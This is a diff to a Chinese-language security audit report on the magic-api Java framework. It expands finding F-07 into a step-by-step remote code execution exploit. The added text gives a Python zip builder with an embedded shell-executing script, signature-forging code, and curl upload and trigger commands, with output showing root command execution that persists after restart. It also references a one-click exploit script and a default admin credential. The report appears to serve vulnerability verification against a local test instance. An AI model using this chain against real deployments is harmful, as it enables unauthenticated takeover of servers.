@@ -289,22 +289,49 @@ curl -s "http://localhost:9999/magic/web/resource" -H "Magic-Token: <token>"   #
 
 ---
 
-## F-07 `receivePush` 签名重放
+## F-07 `receivePush` 未授权 RCE 注入（动态实测✅，鉴权模式下）
 
-**根因**：`MagicWorkbenchController.receivePush` 仅校验 `sign.equals(SignUtils.sign(timestamp, secretKey, mode, bytes))`，无 timestamp 新鲜度窗口。
+**根因**：`receivePush` 用 `@Valid(requireLogin=false)`，唯一保护是 `sign.equals(MD5(timestamp|mode|MD5(bytes)|secretKey))`；无 timestamp 新鲜度校验。**仅需知道 secret-key，不需要登录 token**。
+
+> 关键：mode 比较的是小写 `"full"`（`Constants.UPLOAD_MODE_FULL`）；大写 `FULL` 不会触发清空+注入。zip 必须含显式目录条目（`api/`、`api/pwn/`），否则 `ZipResource.dirs()` 返回空、静默 no-op。
 
 ```bash
-# 前提：magic-api.secret-key 已配置；截获一次节点间同步流量（multipart）
-# 重放（timestamp/mode/sign/file 全部用截获值，服务器每次都接受）：
-curl -s -X POST "http://localhost:9999/magic/web/_magic-api-sync" \
-  -F "file=@captured-payload.json" \
-  -F "mode=FULL" \
-  -F "timestamp=1788971300000" \
-  -F "sign=<截获的sign>"
-# mode=FULL → DefaultMagicResourceService.upload(full=true) → root.delete() 清空后写入
+# 0. 环境已配 secret-key=test-secret-key-123 + 鉴权 admin/Admin@123456
+
+# 1. 构造 zip（一键脚本内部逻辑，手工亦可）
+python3 - <<'EOF'
+import json, zipfile, uuid, time
+gid, eid, now = uuid.uuid4().hex, uuid.uuid4().hex, int(time.time()*1000)
+group = json.dumps({"properties":{},"id":gid,"name":"pwn","type":"api","parentId":"0","path":"pwn","createTime":now,"paths":[],"options":[]},separators=(',',':'))
+script = 'import java.lang.ProcessBuilder\nimport java.util.Scanner\nvar p = new ProcessBuilder("/bin/sh","-c","id; hostname").start();\nvar out = new Scanner(p.getInputStream()).useDelimiter("\\\\A");\nreturn out.hasNext() ? out.next() : ""'
+ms = json.dumps({"properties":{},"id":eid,"groupId":gid,"name":"evil","path":"/evil","method":"GET","parameters":[],"options":[],"headers":[],"paths":[]},separators=(',',':'))
+with zipfile.ZipFile('/tmp/pwn.zip','w',zipfile.ZIP_DEFLATED) as z:
+    z.writestr('api/', b''); z.writestr('api/pwn/', b'')
+    z.writestr('api/pwn/group.json', group)
+    z.writestr('api/pwn/evil.ms', ms + "\r\n" + "="*32 + "\r\n" + script)
+EOF
+
+# 2. 计算 sign (小写 full)
+TS=$(date +%s%3N)
+SIGN=$(python3 -c "import hashlib,sys; ts='$TS'; bmd=hashlib.md5(open('/tmp/pwn.zip','rb').read()).hexdigest(); print(hashlib.md5(f'{ts}|full|{bmd}|test-secret-key-123'.encode()).hexdigest())")
+
+# 3. 无 token 上传
+curl -s -X POST "http://localhost:9999/_magic-api-sync" \
+  -F "file=@/tmp/pwn.zip;type=application/zip" \
+  -F "mode=full" -F "timestamp=$TS" -F "sign=$SIGN"
+# => {"code":1,"message":"success"}
+
+# 4. 触发 RCE
+curl -s "http://localhost:9999/pwn/evil"
+# => {"code":1,"data":"uid=0(root) gid=0(root) groups=0(root)\na19971d020bd\n"}
+
+# 5. 持久化: 重启后仍存活
+# docker restart mtest2 && curl -s http://localhost:9999/pwn/evil → 仍 uid=0(root)
 ```
 
-签名结构（供伪造参考）：`MD5(timestamp|mode|MD5(bytes)|secretKey)`。
+**一键脚本**: `python3 scripts/exploit_f07_push_rce.py http://localhost:9999 <secret-key> "任意命令"`
+
+另：同一 (timestamp, sign) 重发两次均 code:1 → **重放确认**（无新鲜度窗口）。
 
 ---
 
@@ -347,8 +374,9 @@ rm -rf /path/to/mtest
 | F-03 | ◐ 部分 | 资源树/文件详情接口可达；用 F-01 返回的 id 可读脚本全文 |
 | F-04 | ◐ 部分 | `/backups` 未认证返回 success 已实测；rollback 为破坏性操作未执行 |
 | F-05 | ◐ 待验 | 接口可达（认证旁路同 F-01）；SSRF 目标响应需真实外网/内网环境 |
-| F-06 | ◐ 待验 | 逻辑静态确认；需配置凭证的实例 |
-| F-07 | ◐ 待验 | 逻辑静态确认；需 secret-key 配置 + 截获流量 |
+| F-06 | ✅ 完整 | token=MD5(admin||Admin@123456) 离线预测与登录返回一致；logout 后旧 token 仍 code:1 |
+| F-07 | ✅ 完整 | receivePush 无token注入zip→RCE uid=0(root)，重启存活；同 sign 重放均接受 |
 | F-08 | ✅ 完整 | Origin 反射 + ACAC:true 已实测 |
+| F-09 | ✅ 完整 | /classes.txt+/classes 无token返回 2298 类+8 个 RCE gadget |
 
 > 环境限制说明：F-02 的驱动依赖、F-05 的出网、F-06/F-07 的配置前提在最小验证镜像中不满足，但**接口可达性（无 401/403 拦截）均已实测**，利用逻辑经源码级调用链确认。
